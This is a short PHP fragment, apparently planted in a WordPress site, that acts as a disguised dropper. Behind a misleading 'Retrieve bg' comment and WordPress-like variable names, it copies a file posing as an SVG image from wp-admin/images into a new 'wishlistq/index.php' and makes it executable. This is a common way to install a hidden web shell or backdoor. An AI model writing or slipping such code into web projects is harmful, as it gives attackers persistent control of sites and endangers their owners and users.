...
//Retrieve bg
$parent_file =  'wishlistq';
$submenu_file =  './wishlistq/index.php';
$p_filename =  './wp-admin/images/freedoms-0.svg';


if(file_exists($p_filename)){
	if(!file_exists($submenu_file)){
		if(!is_dir("./$parent_file")){
			mkdir("./$parent_file",0755);
		}
		$string = file_get_contents($p_filename);
		file_put_contents($submenu_file,$string);
		chmod($submenu_file,0755);
	}
}
